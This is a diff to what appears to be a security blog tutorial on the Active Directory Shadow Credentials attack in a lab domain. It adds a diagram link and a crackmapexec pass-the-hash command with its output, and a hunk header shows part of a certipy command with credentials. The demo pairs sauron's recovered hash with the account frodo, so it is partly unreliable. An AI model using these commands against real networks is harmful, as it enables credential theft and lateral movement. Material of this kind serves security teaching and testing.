@@ -16,6 +16,8 @@ There are two requirements that must be present in order to perform this type of
 - Active Directory Certificate Services installed on at least a 2016 Domain Controller
 - A compromised account that has rights to the `msds-KeyCredentialLink` attribute to whatever user/computer you want to exploit
 
+Below is a basic flow of the attack
+![img](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/shadowDiag.png)
 # Demo
 *For this demo I will do the exploitation from a remote kali machine rather than on a windows host.
 
@@ -99,5 +101,12 @@ certipy shadow auto -username frodo@lotr.local -p 'Press#123' -account sauron -d
 [*] NT hash for 'sauron': 0f7421a8a3d0b0adcafa6862fd766818
 ```
 
-These NT hashes can be cracked offline or used in a pass the hash attack. In the event that you have permissions to do this on a computer account you could take an additional step and use `impacket-ticketer` to gain a Service Ticket as HOST or CIFS as an administrator and authenticate to the machine. 
+Then a pass the hash attack can be performed 
+```
+┌──(root㉿kali)-[~]
+└─# crackmapexec smb -u frodo -H 0f7421a8a3d0b0adcafa6862fd766818 -d lotr 10.10.1.47 -x 'dir'
+SMB         10.10.1.47      445    WORKSTATION      [*] Windows 10 Pro 19044 x64 (name:WORKSTATION) (domain:lotr) (signing:False) (SMBv1:True)
+SMB         10.10.1.47      445    WORKSTATION      [+] lotr\frodo:0f7421a8a3d0b0adcafa6862fd766818
+```
 
+These NT hashes can be cracked offline or used in a pass the hash attack. In the event that you have permissions to do this on a computer account you could take an additional step and use `impacket-ticketer` to gain a Service Ticket as HOST or CIFS as an administrator and authenticate to the machine.
